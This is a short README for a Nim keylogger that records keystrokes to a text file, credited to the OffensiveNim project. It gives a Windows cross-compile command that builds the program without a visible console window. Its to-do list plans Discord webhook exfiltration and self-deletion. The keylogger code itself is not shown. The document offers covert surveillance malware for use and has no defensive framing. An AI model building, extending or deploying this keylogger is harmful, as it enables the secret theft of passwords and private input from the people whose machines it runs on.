# nim-keylogger
A very simple keylogger that saves and stores key strokes to a text file

## Credits
Credit to: byt3bl33d3r

Source: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/keylogger_bin.nim

## Usage

Install nim (obviously)

How to compile for windows
```sh
nim c --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:windows --passL:-mwindows main.nim
```

## Todo:

* Add discord webhook exfiltration
* Self delete functionality
